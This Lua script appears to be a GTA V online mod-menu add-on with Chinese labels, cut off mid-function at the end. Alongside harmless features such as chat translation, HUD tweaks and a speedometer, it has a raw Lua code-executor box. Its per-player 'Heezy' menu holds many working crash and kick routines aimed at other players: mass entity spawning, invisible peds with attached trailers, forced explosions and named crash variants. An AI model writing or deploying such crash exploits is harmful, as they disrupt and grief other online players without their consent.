	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}


local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end

local chat_translation = menu.list(other_options, "聊天翻译")

settingtrad = menu.list(chat_translation, "翻译设置")
colortradtrad = menu.list(settingtrad, "玩家名称颜色")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
selectmenu = menu.action(colortradtrad, "已选择 : ".."Color : "..colorselec, {}, "这将保存到配置文件中", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "这将保存到配置文件中", function() 
		menu.set_menu_name(selectmenu, "已选择 : ".."Color : "..i)
		colorselec = i
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end

menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] 翻译消息", {"labelteam"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] 翻译消息", {"labelall"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.slider_text(chat_translation, "目标语言", {}, "您需要单击以应用更改", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.slider_text(settingtrad, "翻译信息的位置", {}, "您需要单击以应用更改", {"团队聊天不联网", "团队聊天", "全局聊天不联网", "全局聊天", "通知"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "翻译自己", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "即使语言与所需语言相同,也进行翻译", {}, "可能不会正常工作,因为谷歌是个傻瓜", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "使用旧方法", {}, players.get_name(players.user()).." [全部]玩家:信息", function(on)
	oldway = on	
end)
traduct = true
menu.toggle(chat_translation, "翻译", {}, "", function(on)
	traduct = on	
end, true)

traductmymessage = menu.list(chat_translation, "发送翻译信息")
finallangmenu = menu.slider_text(traductmymessage, "最终语言", {"finallang"}, "翻译成最终语言.您需要单击以应用更改", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "发送信息", {"Sendmessage"}, "输入消息的文本", function(on_click)
    notification("请输入您的消息")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								notification("[翻译] "..players.get_name(packet_sender).." : "..decode(translation))
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)


run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end

player_info  = menu.list(other_options, '玩家信息栏', {''}, '')
InfOverlay = menu.action(player_info, "加载玩家信息栏", {""}, "", function()
    notification("正在加载玩家信息,请稍等")
    util.yield(100)
    menu.delete(InfOverlay)
dofile(filesystem.scripts_dir().."\\BeezyLib\\InfOverlay.lua")

end)

local keyrun = false

local wasdww = menu.list(other_options, '按键显示', {''}, '')

menu.toggle(wasdww, '打开', {'wasd'}, '', function(on) 

	keyrun = on

end, false)

menu.slider(wasdww, 'X轴', {''}, '',1 , 10000, overlay_x * 10000, 20, function(value)

	overlay_x = value / 10000

end)

menu.slider(wasdww, 'Y轴', {''}, '',1 , 10000, overlay_y * 10000, 20, function(value)

	overlay_y = value / 10000

end)

menu.slider(wasdww, '大小', {''}, '',1 , 10000, 300, 20, function(value)

	size = value / 10000

    boxMargin = size / 7

end)

util.create_tick_handler(function()
    if keyrun then
    key_display()
    end
end)



local luacode = menu.list(other_options, "代码")

local executor_code = "util.toast(\"先输入一些代码,笨蛋\")"



local executor_run = function()

    local func = load(executor_code)

    func()

end



menu.text_input(luacode, "输入代码", {"inputLua"}, "输入要执行的Lua代码", function(value)

    executor_code = value

end, executor_code)



menu.action(luacode, "执行代码", {"executeLua"}, "运行上面输入的代码", function() executor_run() end)



local hudminimapmenu = menu.list(other_options, "小地图")

mapzoom = 1

menu.slider(hudminimapmenu, "小地图缩放", {"minimapzoom"}, "", 0, 100, 0, 1, function(s)

    HUD.SET_RADAR_ZOOM_PRECISE(s)

end)



mapangle = 0

menu.slider(hudminimapmenu,"小地图角度", {"minimapanglme"}, "", 0, 360, 0, 1, function(s)

    mapangle = s

end)



mapanglet = off

menu.toggle(hudminimapmenu,"锁定地图角度", {"lockminimapangle"}, "", function(on)

	mapanglet = on

	while mapanglet do

		HUD.LOCK_MINIMAP_ANGLE(mapangle)

		util.yield()

	end

	HUD.UNLOCK_MINIMAP_ANGLE()

end)





menu.toggle(hudminimapmenu,"显示声呐", {"sonaronmap"}, "", function(on)

	HUD.SET_MINIMAP_SONAR_SWEEP(on)

end)



 centermap = off

menu.toggle(hudminimapmenu, "以你为中心的地图", {"centermap"}, "", function(on)

	centermap = on

	while centermap do 

		HUD.DONT_TILT_MINIMAP_THIS_FRAME()

		util.yield()

	end

end)



local misclightmenu = menu.list(other_options, "靓仔")



rlight = 255

menu.slider(misclightmenu, "R", {"lightred"}, "", 0, 255, 255, 1, function(s)

	rlight = s 

end)



glight = 255

menu.slider(misclightmenu, "G", {"lightgreen"}, "", 0, 255, 255, 1, function(s)

	glight = s

end)



blight = 255

menu.slider(misclightmenu, "B", {"lightblue"}, "", 0, 255, 255, 1, function(s)

	blight = s

end)



Radiuslight = 1

menu.slider(misclightmenu, "半径" ,{"lightradius"}, "", 0, 9000, 1, 1, function(s)

	Radiuslight = s

end)



intenslight = 1

menu.slider(misclightmenu, "强度", {"lightintensity"}, "", 0, 1000, 1, 1, function(s)

	intenslight = s

end)

menu.toggle_loop(misclightmenu, "靓仔", {"lighton"}, "", function()

    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())

	GRAPHICS.DRAW_LIGHT_WITH_RANGE(pos.x, pos.y, pos.z, rlight, glight, blight, Radiuslight, intenslight)

end)
local user_options = menu.list(other_options, "用户设置")
mmtluascriptchatsession = false
menu.toggle(user_options,"检测之后发送聊天", {}, "", function(on)
    mmtluascriptchatsession = on

end)
v3_2t1 = function (x, y, z)
	x = x or 0.0
	y = y or 0.0
	z = z or 0.0
	local vec =
	{	x = x, y = y or x, z = z or x,

		magnitude = function (self, other)
			local end_vec = other and (self - other) or self
			return math.sqrt(end_vec.x^2 + end_vec.y^2 + end_vec.z^2)
		end,
		transformRotToDir = function(self, deg_z, deg_x)
			local rad_z = deg_z * math.pi / 180;
			local rad_x = deg_x * math.pi / 180;
			local num = math.abs(math.cos(rad_x));
			self.x = -math.sin(rad_z) * num
			self.y = math.cos(rad_z) * num
			self.z = math.sin(rad_x)
		end,
		degToRad = function (self)
			self.x = self.x * math.pi / 180
			self.y = self.y * math.pi / 180
			self.z = self.z * math.pi / 180
		end,
		radToDeg = function (self)
			self.x = self.x * 180 / math.pi
			self.y = self.y * 180 / math.pi
			self.z = self.z * 180 / math.pi
		end
	}
	setmetatable(vec, v3_meta)
	return vec
end
set_entity_coords_no_offset_2t1 = function (ent, pos)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ent, pos.x, pos.y, pos.z)
    return true
end
create_vehicle_2t1 = function (hash, pos, heading, networked, alwaysFalse)
    local veh = entities.create_vehicle(hash, pos, heading)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(veh, true)
    return veh
end
local function spawn_vehicle(hash, coords, dir, maxed, god)
    request_model_load(hash)
    if maxed then	
        set_entity_coords_no_offset_2t1(car, coords)
        ENTITY.SET_ENTITY_HEADING(car, dir)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    else
        local car = create_vehicle_2t1(hash, coords, dir, true, false)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    end
end
menu.action(user_options,"设置为Lua用户", {""}, "切换战局需要重新设置,按一次就够了", function(m)
    pos = v3_2t1(0, 0, 0)
    dune = spawn_vehicle(534258863, pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    pos.z = pos.z - players.user()
    set_entity_coords_no_offset_2t1(dune, pos)
end)
local function int_to_uint(int)
	if int >= 0 then
		return int
	end
	return (1 << 32) + int
end
send_player_sms_2t1 = function (pid, message)
    menu.trigger_commands("smstext"..players.get_name(pid).." "..message)
    menu.trigger_commands("smssend"..players.get_name(pid))
end
--chat.send_message(PLAYER.GET_PLAYER_NAME(pid)..'  666 ',false,true,true)
menu.action(user_options,"检测用户", {},"", function()
    oldpos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    ENTITY.GET_ENTITY_COORDS(players.user_ped(), 0, 0, 0)
    util.yield(500)
    set_entity_coords_no_offset_2t1(players.user_ped(), oldpos)
    allvehs = entities.get_all_vehicles_as_handles()
    for i = 1, #allvehs do
      vehhash = int_to_uint(ENTITY.GET_ENTITY_MODEL(allvehs[i]))
      if vehhash == 534258863 then
        pos = ENTITY.GET_ENTITY_COORDS(allvehs[i])
        if 0 == pos.x and 0 == pos.y then
          print(tostring(pos.z))
          nopid = 0 - pos.z
          pid = math.floor(nopid)
          if mmtluascriptchatsession then
            if pid ~= players.user() then
              mmmtuser = players.get_name(pid)
              chat.send_message("检测到尊贵的Heezy二代目用户["..mmmtuser.."]", false,true, true)
              notification("检测到用户"..mmmtuser)
            end
          elseif pid ~= players.user() then
            print(pid)
            mmmtuser = players.get_name(pid)
            send_player_sms_2t1(pid, "~h~Hello,尊贵的Heezy用户[~r~"..mmmtuser.."~w~]")
            notification("检测到用户"..mmmtuser)
          end
        end
        util.yield(1)
      end
      util.yield(1)
    end
end)

menu.action(other_options, "重新启动GTAV", {""}, "", function(on_click)

    MISC.RESTART_GAME()

end)

menu.action(other_options, "打个赌", {}, "赌一赌会不会自崩", function()
    if randomizer(array) == "1" then
        notification("你的游戏幸存了下来")
    else
        notification("看起来你的游戏崩了")
    util.yield(3000)
        ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, false)
    end
end)

menu.toggle_loop(other_options, "显示图片", {"picture"}, "", function()
    logo_alpha = 1
    directx.draw_texture(logo, 0.06, 0.1, 0.0, 0.0, 0.86, 0.57, 0, 1, 1, 1, logo_alpha)
end)
local split_2t1 = function (input, sep)
    local t={}
    for str in string.gmatch(input, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end
get_all_files_in_directory_2t1 = function (path, extension)
    local files = filesystem.list_files(path)
    local result = {}
    for _, file in ipairs(files) do
        if filesystem.is_regular_file(file) then
             local split_file = split_2t1(file, ".")
            if #split_file > 1 and split_file[#split_file] == extension then
                local file_subs = split_2t1(file, "\\")
                result[#result+1] = file_subs[#file_subs]
            end
        end
    end
    return result
end
files_table={}
local files_table1 = get_all_files_in_directory_2t1(filesystem.scripts_dir().."\\HeezyScript\\GIF","jpg")
if #files_table1 > 1 then
	local time=0
	local file_num = 1
	for o=1,#files_table1 do
		files_table[o] = directx.create_texture(filesystem.scripts_dir().."\\HeezyScript\\GIF\\"..files_table1[o])
	end
menu.toggle(other_options, "电摇", {"gif"}, "", function(state)
    gif =state
    while gif do
        if time == 1 then  --数字越小，GIF速度越快
            time = 0
            file_num = file_num+1
        else
            time = time+1
        end
        if file_num == #files_table1 then
            file_num = 1
        end
        directx.draw_texture(files_table[file_num], 0.06, 0.1, 0.5 , 0.5, 0.86,0.57,0, 1, 1, 1, 1)
        util.yield(5)
    end
end)

end

menu.toggle_loop(other_options, "时速表", {"speedmeteor"}, "", function()
    local ent
        local ent1 = players.user_ped()
        local ent2 = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
        if PED.IS_PED_IN_ANY_VEHICLE(ent1,true) then
            ent = ent2
        else
            ent = ent1
        end
        local speed = ENTITY.GET_ENTITY_SPEED(ent)
        local speedcalc = speed * 3.6
        myspeed1 = math.ceil(speedcalc)    
        draw_string(string.format("~bold~~italic~~o~"..myspeed1 .. "  ~w~KM/H"), 0.84,0.8, 1,5)
end)

menu.toggle_loop(other_options, "显示时间", {"timeos"}, "", function(state)
    draw_string(string.format(os.date('~bold~~italic~%Y-%m-%d %H:%M:%S', os.time())), 0.83,0.1, 0.5,5)
end)

menu.action(other_options,"保存设置", {}, "", function()
	ini.save(configFile, gConfig)
end)


menu.toggle_loop(other_options, "显示脚本名称", {"scriptname"}, "", function(toggle)
    rainbow_color()
    draw_string(string.format("                   ¦-∑\n ~h~<i>尊贵的Heezy用户: "..PLAYER.GET_PLAYER_NAME(players.user())), 0.32,0.1, 0.60,5)
end)

menu.toggle_loop(other_options, "Ozark头部信息", {"Ozark"}, "", function()
    GRAPHICS.DRAW_RECT(0.001, 5, 0.999, 0.085, 0, 0, 0, 0)
    HUD.SET_TEXT_COLOUR(125,127,133, 200)
    HUD.SET_TEXT_SCALE(1.0,0.5)
    HUD.SET_TEXT_FONT(2)
    HUD.SET_TEXT_CENTRE(true)
    HUD.SET_TEXT_OUTLINE(true)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("F4")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.5,0.125,0)
    GRAPHICS.DRAW_RECT(0.001, 0.999, 4.5, 0.085, 0, 0, 0, 0)
    HUD.SET_TEXT_SCALE(1.0,0.53)
    HUD.SET_TEXT_COLOUR(57,20,55,200)
    HUD.SET_TEXT_FONT(2)
    HUD.SET_TEXT_CENTRE(true)
    HUD.SET_TEXT_OUTLINE(true)
    util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("Ozark V32")
    HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.5,0.1,0)
end)
menu.toggle_loop(other_options, "主机序列", {"hostqu"}, "", function()
    x1x()
end)

menu.toggle(other_options, "玩家栏", {"playersbar"}, "", function(state)
    bar = state        
    while bar do
    posx = 0.001
    posy = 0.00
    for pid = 0,31 do
    if PLAYER.GET_PLAYER_PED(pid) ~= 0 then
    color =  {["r"] = 255/255,["g"] = 255/255,["b"] = 255/255,["a"] = 255/255} 
    tags = ""
    network = memory.alloc(13*4)
    name = PLAYER.GET_PLAYER_NAME(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid,network,13)
    if players.is_marked_as_modder(pid) then
        tags = tags .. "[作弊者]"
    color = {["r"] = 255/255,["g"] = 0/255,["b"] = 0/255,["a"] = 255/255}   
    end
    if players.is_godmode(pid) then 
        tags = tags .. "[无敌]"
    color = {["r"] = 255/255,["g"] = 0/255,["b"] = 255/255,["a"] = 255/255} 
    end
    if players.is_in_interior(pid) then
        tags = tags .. "[室内]"
    color = {["r"] = 0/255,["g"] = 255/255,["b"] = 255/255,["a"] = 255/255} 
    end
    if players.is_marked_as_attacker(pid) then
        tags = tags .. "[攻击过你]"
    color = {["r"] = 255/255,["g"] = 255/255,["b"] = 128/255,["a"] = 255/255} 
    end
    if NETWORK.NETWORK_IS_FRIEND(network) then
        tags = tags .. "[好友]"
    color = {["r"] = 7/255,["g"] = 55/255,["b"] = 99/255,["a"] = 255/255}
    end
    if players.get_host() == pid then
        tags = tags .. "[主机]"
    color = {["r"] = 0/255,["g"] = 255/255,["b"] = 0/255,["a"] = 255/255} 
    end
    if players.get_script_host() == pid then
        tags = tags .. "[脚本主机]"
    color = {["r"] = 153/255,["g"] = 0/255,["b"] = 255/255,["a"] = 255/255} 
    end
    memory.free(network)
    directx.draw_text(posx,posy,name.." "..tags,ALIGN_TOP_LEFT,0.5,color)
    posx = posx + 0.145
    if posx > 0.96 then
    posy = posy + 0.0175
    posx = 0.001
    end
    end
    end
    util.yield()
    end
    end)
menu.action(other_options,"停止脚本",{},"",function ()
    util.stop_script()
end)


util.yield(100)



GenerateFeatures = function(PlayerID)

    menu.divider(menu.player_root(PlayerID), "Heezy二代目")

    Heezy = menu.list(menu.player_root(PlayerID), "Heezy二代目", {"Heezy"}, "", function(); end)

    kick = menu.list(Heezy, "踢出", {}, "", function(); end)


    menu.action(kick, "阻止加入踢", {"blast"}, "将他们踢出并加入到阻止加入列表上", function()

        menu.trigger_commands("historyblock " .. players.get_name(PlayerID))

        menu.trigger_commands("breakup " .. players.get_name(PlayerID))

    end)

    PlayerMainMenu = menu.list(Heezy, "移除", {}, "", function(); end)

    menu.action(PlayerMainMenu, "AIO崩", {}, "远离!!!远离!!!远离!!!远离!!!", function()

    aaio(PlayerID)

    end)

    menu.action(PlayerMainMenu, "制裁XP V1", {"crashxpv1"}, "", function()

        menu.trigger_commands("crash " .. players.get_name(PlayerID))

        menu.trigger_commands("smash " .. players.get_name(PlayerID))

    end)

    menu.action(PlayerMainMenu, "制裁XP V2", {"crashxpv2"}, "", function()
        local cord = players.get_position(PlayerID)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        notification("Finished.")
    end)

   menu.action(PlayerMainMenu, "制裁XP V3", {}, "狠狠滴制裁XiPro", function()
            local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
                    local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                    local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
                    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
                    for i = 1, 3, 1 do
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
                        for spawn, value in pairs(model_array) do
                            local vels = {}
                            vels[spawn] = CreateVehicle(value, BAD_attach, 0)
                            for attach, value in pairs(vels) do
                                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
                            end
                        end
                        util.yield(500)
                        menu.trigger_commands("explode" ..  players.get_name(PlayerID))
                    end
    end)   

   menu.action(PlayerMainMenu, "北域崩溃", {"crashbeiyu"}, "", function()
    if pid ~= players.user() then
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))
    local michael = util.joaat("player_zero")
    while not STREAMING.HAS_MODEL_LOADED(michael) do
        STREAMING.REQUEST_MODEL(michael)
        util.yield()
    end
    local ped = entities.create_ped(0, michael, pos, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
    util.yield()
    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(ped)
    util.toast("发送到 " .. players.get_name(PlayerID))
    util.log("发送到 " .. players.get_name(PlayerID))
    end
end)

   menu.action(PlayerMainMenu, "樱桃崩溃", {"crashyingtao"}, "", function()
    if pid ~= players.user() then
    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("choke" .. PLAYER.GET_PLAYER_NAME(PlayerID))
    menu.trigger_commands("flashcrash" .. PLAYER.GET_PLAYER_NAME(PlayerID))
    util.yield()
    util.toast("发送到 " .. players.get_name(PlayerID))
    util.log("发送到 " .. players.get_name(PlayerID))
    end
end)

   menu.action(PlayerMainMenu, "回弹崩溃", {"crashhuitan"}, "", function()
        if pid ~= players.user() then
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = players.get_position(PlayerID)
        local mdl = util.joaat("mp_m_freemode_01")
        local veh_mdl = util.joaat("taxi")
        util.request_model(veh_mdl)
        util.request_model(mdl)
            for i = 1, 10 do
                if not players.exists(PlayerID) then
                    return
                end
                local veh = entities.create_vehicle(veh_mdl, pos, 0)
                local jesus = entities.create_ped(2, mdl, pos, 0)
                PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                util.yield(100)
                TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                util.yield(1000)
                entities.delete_by_handle(jesus)
                entities.delete_by_handle(veh)
            end  
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    util.toast("发送给 " .. players.get_name(PlayerID))
    util.log("发送给 " .. players.get_name(PlayerID))
    end
end)

   menu.action(PlayerMainMenu, "黄昏崩溃", {"crashhuanghun"}, "", function()
   local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local mdl = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(mdl) do
            STREAMING.REQUEST_MODEL(mdl)
            util.yield(5)
        end

        local ped = {}
        for i = 1, 10 do 
            local coord = ENTITY.GET_ENTITY_COORDS(player, true)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            ped[i] = entities.create_ped(0, mdl, coord, 0)

            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)

            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(PlayerID) .. " explode " .. PLAYER.GET_PLAYER_NAME(PlayerID) .. " ")

            ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
            util.yield(25)
        end
        util.yield(2500)
        for i = 1, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(25)
        end

    end)
    menu.click_slider(PlayerMainMenu,"奥特曼崩(不要靠近和观看）", {"aoteman"}, "1 = V1, 2 = V2, 3 = V3", 1, 3, 1, 1, function(on_change)       

        if on_change == 1 then		

            aotemanv1(PlayerID)

        end

        if on_change == 2 then

            aotemanv2(PlayerID)

        end

        if on_change == 3 then

            aotemanv3(PlayerID)

        end   

    end)

    

    menu.action(PlayerMainMenu, "Inshallah crash-----by 伟大的GK", {""}, "", function()

        local TargetPPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID))

        local PED1  = CreatePed(28,-1011537562,TargetPPos,0)

        local PED2  = CreatePed(28,-541762431,TargetPPos,0)

        WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)

        WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)

        util.yield(1000)

        TASK.TASK_THROW_PROJECTILE(PED1,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)

        TASK.TASK_THROW_PROJECTILE(PED2,TargetPPos.x,TargetPPos.y,TargetPPos.z,0,0)

        notification("Finished.")

    end)

    menu.action(PlayerMainMenu, "悲伤的耶稣崩溃", {"grief"}, "可以崩溃大多数菜单.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = players.get_position(PlayerID)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
